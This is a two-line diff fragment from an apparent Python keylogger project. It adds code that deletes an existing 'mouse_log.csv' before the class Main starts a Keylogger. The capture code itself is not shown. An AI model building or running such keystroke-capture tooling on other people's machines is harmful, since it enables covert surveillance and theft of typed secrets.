@@ -26,6 +26,8 @@ def foo():
 
 class Main:
     def __init__(self):
+        if os.path.isfile("mouse_log.csv"):
+            os.remove("mouse_log.csv")
         Keylogger()
         foo()
 
